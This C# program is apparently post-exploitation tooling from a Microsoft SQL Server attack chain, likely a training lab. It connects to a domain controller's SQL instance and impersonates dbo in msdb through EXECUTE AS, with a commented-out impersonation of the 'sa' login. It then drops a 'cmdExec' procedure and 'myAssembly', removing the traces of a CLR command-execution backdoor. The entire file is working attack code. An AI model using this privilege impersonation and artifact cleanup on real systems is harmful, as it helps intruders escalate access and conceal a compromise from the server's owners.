using System;
using System.Data.SqlClient;

namespace CleanUP
{
    class Program
    {
        static void Main(string[] args)
        {
            // 替换目标 MSSQL 服务器地址 :
            String sqlServer = "dc01.corp1.com";
            String database = "master";

            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            // String impersonateUser = "EXECUTE AS LOGIN = 'sa';";
            String switchdb = "use msdb; EXECUTE AS USER = 'dbo';";
            String dropproc = "DROP PROCEDURE cmdExec;";
            String dropasm = "DROP ASSEMBLY myAssembly;";

            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }

            // SqlCommand command = new SqlCommand(impersonateUser, con);
            // SqlDataReader reader = command.ExecuteReader();
            // reader.Close();

            SqlCommand command = new SqlCommand(switchdb, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(dropproc, con);
            reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(dropasm, con);
            reader = command.ExecuteReader();
            reader.Close();

            con.Close();
        }
    }
}